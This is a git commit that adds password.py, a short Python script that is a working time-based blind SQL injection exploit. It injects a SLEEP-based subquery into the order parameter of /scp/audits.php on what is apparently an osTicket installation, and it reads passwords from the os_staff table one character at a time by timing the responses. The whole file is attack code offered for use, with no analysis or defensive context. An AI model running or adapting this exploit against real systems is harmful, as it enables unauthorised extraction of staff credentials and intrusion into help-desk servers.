ca82874e85da9f40210d8d8fdb49e9e484701b88
DIMOOON <68978608+reewardius@users.noreply.github.com>
2023-02-18 14:45:39 +0200

    Create password.py

---
+++ password.py
@@ -0,0 +1,26 @@
+import requests
+import urllib
+import string
+
+HOSTNAME = 'http://localhost'
+cookie = {'OSTSESSID': '...'}
+headers = {'User-Agent': '...'}
+alphabet = string.ascii_lowercase + string.digits + '-_!'
+position = 1
+offset = 0
+password = ''
+
+while True:
+    found_letter = False
+    for letter in alphabet:
+        payload = "(select case when ((select substring(password," + str(position) + ",1) from os_staff LIMIT 1 OFFSET " + str(offset) + ")='" + letter + "') then sleep(0.3) else 1 end);"
+        result = requests.get(HOSTNAME + '/scp/audits.php?&type=S&state=All&order=ASC,' + urllib.parse.quote(payload) +'--&sort=timestamp&_pjax=%23pjax-container', cookies=cookie, headers=headers)
+        if result.elapsed.total_seconds() > 2:
+            password += letter
+            found_letter = True
+            break
+    if not found_letter:
+        break
+    position += 1
+
+print(password)
